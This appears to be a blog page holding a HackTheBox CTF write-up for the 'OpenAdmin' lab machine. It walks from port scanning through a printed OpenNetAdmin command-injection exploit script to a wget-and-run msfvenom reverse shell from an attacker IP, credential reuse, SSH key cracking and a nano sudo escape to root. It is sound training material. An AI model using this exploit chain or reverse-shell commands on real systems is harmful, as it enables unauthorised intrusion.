<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>OpenAdmin | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,easy"><meta name=description content="OpenAdmin HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/openadmin/><link crossorigin=anonymous href=/assets/css/stylesheet.35b906a90813b2766df33de5f84bf4610918496b745304c45e387646ed743bea.css integrity="sha256-NbkGqQgTsnZt8z3l+Ev0YQkYSWt0UwTEXjh2Ru10O+o=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/openadmin/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="OpenAdmin "><meta property="og:description" content="OpenAdmin HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/openadmin/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/openadmin/openadmin.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-05-01T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/openadmin/openadmin.png"><meta name=twitter:title content="OpenAdmin "><meta name=twitter:description content="OpenAdmin HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"OpenAdmin ","item":"https://s4ch.github.io/writeups/hackthebox/openadmin/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"OpenAdmin ","name":"OpenAdmin ","description":"OpenAdmin HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","easy"],"articleBody":"≡ƒÆó Info Name: OpenAdmin Profile: www.hackthebox.eu Difficulty: Easy OS: Linux Points: 20 Overview Network Enumeration: port 80, 22 Web Application Enumeration: find /ona/ Web Application Exploitation: OpenNetAdmin RCE System enumeration and exploration in the jungle: mysql creds + 127.0.0.1:52846 System Privilege Escalation : www-data to jimmy: credential stuffing System Privilege Escalation : jimmy to joanna: password crack System Privilege Escalation : joanna to root: nano escape Network Enumeration TL;DR: port 80, 22\nLet’s begin by finding open ports with a SYN nmap scan and then trying to run default scripts and finding the version of those services.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ sudo nmap -p- -sS 10.10.10.171 -oA nmap_ports [sudo] password for cyfun: Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 10:45 CET Nmap scan report for 10.10.10.171 Host is up (0.025s latency). Not shown: 65533 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 31.23 seconds $ sudo nmap -p 80,22 -sSCV 10.10.10.171 -oA nmap_services Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 10:46 CET Nmap scan report for 10.10.10.171 Host is up (0.024s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.89 seconds As often, only a web app.\nWeb Application Enumeration TL;DR: find /ona/\nWith a web directory finder like dirsearch or ffuf and a good wordlist, we can try to enumerate the possible sub-folders.\n1 2 3 4 [14:04:59] 301 - 312B - /music -\u003e http://10.10.10.171/music/ [14:05:01] 301 - 314B - /artwork -\u003e http://10.10.10.171/artwork/ [14:05:04] 403 - 277B - /server-status [14:05:13] 301 - 313B - /sierra -\u003e http://10.10.10.171/sierra/ Many rabbit hole sub-directories but on http://10.10.10.171/music/ there is a login button leading to http://10.10.10.171/ona/ where is hosted an OpenNetAdmin v18.1.1 instance.\nWe can see an alert message telling there is a newer version available and that we have version 18.1.1 of OpenNetAdmin.\nWeb Application Exploitation TL;DR: OpenNetAdmin RCE\nWith the Exploit-DB tool searchsploit we search if there are available exploits.\nsearchsploit OpenNetAdmin shows there is a RCE for 18.1.1.\nNote: I got some error with the exploit that was due to the EOL char, I copied the exploit and converted CRLF to LF.\nWe just have to give the login URL to the exploit to get a pseudo-shell.\n1 2 3 bash 47691.sh http://10.10.10.171/ona/login.php $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) System enumeration and exploration in the jungle TL;DR: mysql creds + 127.0.0.1:52846\nLet’s try some basic commands and see if we can find something juicy.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 $ pwd /opt/ona/www $ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false joanna:x:1001:1001:,,,:/home/joanna:/bin/bash $ uname -a Linux openadmin 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux At some point I ran linpeas.sh (from PEASS suite) and found there was not only /opt/ona/www related to OpenNetAdmin but also /var/www/html/ona.\nIn there are the database credentials.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ cat /var/www/html/ona/local/config/database_settings.inc.php \u003c?php $ona_contexts=array ( 'DEFAULT' =\u003e array ( 'databases' =\u003e array ( 0 =\u003e array ( 'db_type' =\u003e 'mysqli', 'db_host' =\u003e 'localhost', 'db_login' =\u003e 'ona_sys', 'db_passwd' =\u003e 'n1nj4W4rri0R!', 'db_database' =\u003e 'ona_default', 'db_debug' =\u003e false, ), ), 'description' =\u003e 'Default data context', 'context_color' =\u003e '#D3DBFF', ), ); At some point I got bored of the pseudo-shell via the RCE exploit so I decided to get a meterpreter reverse shell. A better reason is that we can’t use interactive client such a mysql client from the RCE so we need a real shell.\nThe RCE exploit is pretty simple:\n1 2 3 4 5 6 7 #!/bin/bash URL=\"${1}\" while true;do echo -n \"$ \"; read cmd curl --silent -d \"xajax=window_submit\u0026xajaxr=1574117726710\u0026xajaxargs[]=tooltips\u0026xajaxargs[]=ip%3D%3E;echo \\\"BEGIN\\\";${cmd};echo \\\"END\\\"\u0026xajaxargs[]=ping\" \"${URL}\" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1 done So to upload an execute my reverse shell I tried:\n1 curl --silent -d \"xajax=window_submit\u0026xajaxr=1574117726710\u0026xajaxargs[]=tooltips\u0026xajaxargs[]=ip%3D%3E;echo \\\"BEGIN\\\";wget http://10.10.15.151:443/80.bin; chmod +x 80.bin; ./80.bin ;echo \\\"END\\\"\u0026xajaxargs[]=ping\" \"http://10.10.10.171/ona/login.php\" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1 The shell wasn’t executed because we can’t chmod +x for whatever reason.\nSo I tried a trick to execute the shell: /lib64/ld-linux-x86-64.so.2 /opt/ona/www/80.bin but it didn’t work.\nI found a quite useful article What can you do when you can’t chmod chmod? were I learned about a command to copy the permissions of a binary.\nSo I used getfacl and setfacl to copy permissions from another binary.\n1 getfacl /bin/ls | setfacl --set-file=- 80.bin It seems Meterpreter has an upstream bug with shell.\nSo in short here what I did to get my reverse shell:\n1 2 3 4 5 6 7 # Attacker msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.15.151 LPORT=80 -f elf \u003e 80.bin # Target wget http://10.10.15.151:443/80.bin getfacl /bin/ls | setfacl --set-file=- 80.bin ./80.bin Listener + PTY:\n1 2 3 4 5 6 7 8 9 10 msf5 \u003e use exploit/multi/handler msf5 exploit(multi/handler) \u003e set payload linux/x64/shell_reverse_tcp payload =\u003e linux/x64/shell_reverse_tcp msf5 exploit(multi/handler) \u003e set LPORT 80 LPORT =\u003e 80 msf5 exploit(multi/handler) \u003e set LHOST 10.10.15.151 LHOST =\u003e 10.10.15.151 msf5 exploit(multi/handler) \u003e run python3 -c 'import pty;pty.spawn(\"/bin/bash\")' Now we can use the interactive mysql client with the credentials we looted earlier:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 www-data@openadmin:/opt/ona/www$ mysql -u ona_sys -p mysql\u003e show tables; show tables; +------------------------+ | Tables_in_ona_default | +------------------------+ | blocks | | configuration_types | | configurations | | custom_attribute_types | | custom_attributes | | dcm_module_list | | device_types | | devices | | dhcp_failover_groups | | dhcp_option_entries | | dhcp_options | | dhcp_pools | | dhcp_server_subnets | | dns | | dns_server_domains | | dns_views | | domains | | group_assignments | | groups | | host_roles | | hosts | | interface_clusters | | interfaces | | locations | | manufacturers | | messages | | models | | ona_logs | | permission_assignments | | permissions | | roles | | sequences | | sessions | | subnet_types | | subnets | | sys_config | | tags | | users | | vlan_campuses | | vlans | +------------------------+ 40 rows in set (0.00 sec) mysql\u003e select * from users; select * from users; +----+----------+----------------------------------+-------+---------------------+---------------------+ | id | username | password | level | ctime | atime | +----+----------+----------------------------------+-------+---------------------+---------------------+ | 1 | guest | 098f6bcd4621d373cade4e832627b4f6 | 0 | 2020-03-13 15:46:03 | 2020-03-13 15:46:03 | | 2 | admin | 21232f297a57a5a743894a0e4a801fc3 | 0 | 2020-03-13 15:45:04 | 2020-03-13 15:45:04 | +----+----------+----------------------------------+-------+---------------------+---------------------+ 2 rows in set (0.00 sec) All of that was nearly useless because the password hash of the admin user is the md5 of admin so we could have guessed it pretty easily.\nWith ss -nlp let list open sockets:\n1 2 3 4 5 6 tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:* tcp LISTEN 0 128 127.0.0.1:52846 0.0.0.0:* tcp LISTEN 0 128 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 14 128 *:80 *:* tcp LISTEN 0 128 [::]:22 [::]:* We can see the public web server listening on all interfaces on port 80, the SSH server, the internally exposed database on port 3306, but what’s running on port 52846? Seems it’s a web server.\nThe body looks like this:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u003cbody\u003e \u003ch2\u003eEnter Username and Password\u003c/h2\u003e \u003cdiv class = \"container form-signin\"\u003e \u003ch2 class=\"featurette-heading\"\u003eLogin Restricted.\u003cspan class=\"text-muted\"\u003e\u003c/span\u003e\u003c/h2\u003e \u003c/div\u003e \u003cdiv class = \"container\"\u003e \u003cform class = \"form-signin\" role = \"form\" action = \"/index.php\" method = \"post\"\u003e \u003ch4 class = \"form-signin-heading\"\u003e\u003c/h4\u003e \u003cinput type = \"text\" class = \"form-control\" name = \"username\" required autofocus\u003e\u003c/br\u003e \u003cinput type = \"password\" class = \"form-control\" name = \"password\" required\u003e \u003cbutton class = \"btn btn-lg btn-primary btn-block\" type = \"submit\" name = \"login\"\u003eLogin\u003c/button\u003e \u003c/form\u003e \u003c/div\u003e \u003c/body\u003e There is a login page on 127.0.0.1:52846, let’s try to login with the creds we found on the database.\n1 curl -X POST http://127.0.0.1:52846/index.php --data 'username=admin\u0026password=admin\u0026login=Submit' I obtain a Wrong username or password. :(\nBut if take a look at the owner of the internal website, it seems it’s jimmy:\n1 2 3 4 5 6 www-data@openadmin:/var/www$ ls -lh ls -lh total 8.0K drwxr-xr-x 6 www-data www-data 4.0K Nov 22 15:59 html drwxrwx--- 2 jimmy internal 4.0K Mar 13 15:53 internal lrwxrwxrwx 1 www-data www-data 12 Nov 21 16:07 ona -\u003e /opt/ona/www System Privilege Escalation : www-data to jimmy TL;DR: credential stuffing\nIt could be helpful to read the source code but with www-data we are not in the internal group so we need to connect as jimmy to read the source code.\nA big guessing step involved here: we needed to re-use the MySQL ona_sys user password (n1nj4W4rri0R!) as jimmy PAM password for ssh. I think the idea was credentials stuffing if jimmy is the dev of the internal web app he may have reused his own personal password for dev purpose like the DB.\nNow cen can connect and look at the source code:\n1 2 3 4 5 6 7 8 9 10 $ ssh jimmy@10.10.10.171 jimmy@openadmin:~$ ls -la /var/www/internal/ total 20 drwxrwx--- 2 jimmy internal 4096 Mar 13 15:53 . drwxr-xr-x 4 root root 4096 Nov 22 18:15 .. -rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php -rwxrwxr-x 1 jimmy internal 185 Nov 23 16:37 logout.php lrwxrwxrwx 1 jimmy jimmy 17 Mar 13 15:53 lol -\u003e /var/www/html/lol -rwxrwxr-x 1 jimmy internal 339 Nov 23 17:40 main.php In index.php\n1 2 3 4 5 6 7 8 9 10 11 12 \u003c?php $msg = ''; if (isset($_POST['login']) \u0026\u0026 !empty($_POST['username']) \u0026\u0026 !empty($_POST['password'])) { if ($_POST['username'] == 'jimmy' \u0026\u0026 hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') { $_SESSION['username'] = 'jimmy'; header(\"Location: /main.php\"); } else { $msg = 'Wrong username or password.'; } } ?\u003e The password of jimmy (for the internal web app) is hardcoded and we can break the SHA512 with an online service for example.\n00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1 -\u003e Revealed\nSo we can connect as jimmy and be redirected to main.php (header(\"Location: /main.php\");).\nSystem Privilege Escalation : jimmy to joanna TL;DR: password crack\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 $ curl -X POST http://127.0.0.1:52846/index.php --data 'username=jimmy\u0026password=Revealed\u0026login=Submit' $ curl -X POST http://127.0.0.1:52846/main.php -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8 ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE 6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI 9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4 piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/ /U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH 40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb 9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80 X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr 1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2 XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79 yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM +4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN -----END RSA PRIVATE KEY----- uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal) Don't forget your \"ninja\" password Click here to logout Session We could also have look at main.php directly on the file system too but I wanted to follow the application logic.\nIt seems we have a private key from joanna user, which is encrypted and password protected but we also have a hint to crack it: Don’t forget your “ninja” password.\nLet’s crack it with JtR (John the Ripper):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ ssh2john id_rsa /usr/bin/ssh2john:103: DeprecationWarning: decodestring() is a deprecated alias since Python 3.1, use decodebytes() data = base64.decodestring(data) id_rsa:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d $ john --wordlist=/usr/share/wordlists/password/rockyou.txt john.txt Warning: detected hash type \"SSH\", but the string is also recognized as \"ssh-opencl\" Use the \"--format=ssh-opencl\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 2 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press 'q' or Ctrl-C to abort, almost any other key for status bloodninjas (id_rsa) Warning: Only 1 candidate left, minimum 2 needed for performance. 1g 0:00:00:08 DONE (2020-03-13 17:35) 0.1237g/s 1774Kp/s 1774Kc/s 1774KC/s *7┬íVamos! Session completed The password is bloodninjas to unlock the private key of joanna.\nWe can connect now.\nSystem Privilege Escalation : joanna to root TL;DR: nano escape\n1 2 3 4 5 6 7 8 9 10 $ ssh joanna@10.10.10.171 -i id_rsa joanna@openadmin:~$ cat user.txt c9b2cf07d40807e62af62660f0c81b5f $ sudo -l Matching Defaults entries for joanna on openadmin: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User joanna may run the following commands on openadmin: (ALL) NOPASSWD: /bin/nano /opt/priv EZ pe: escape nano thanks to GTFObins\nSee https://gtfobins.github.io/gtfobins/nano/.\n1 2 # cat /root/root.txt 2f907ed450b361b2c2bf4e8795d5b561 ","wordCount":"2286","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/openadmin/openadmin.png","datePublished":"2020-05-01T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/openadmin/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">OpenAdmin</h1><div class=post-description>OpenAdmin HackTheBox writeup</div><div class=post-meta><span title='2020-05-01 00:00:00 +0000 UTC'>May 1, 2020</span>&nbsp;·&nbsp;11 min&nbsp;·&nbsp;2286 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/easy/ class=post-tag title=easy>easy</a>
&nbsp;·&nbsp;
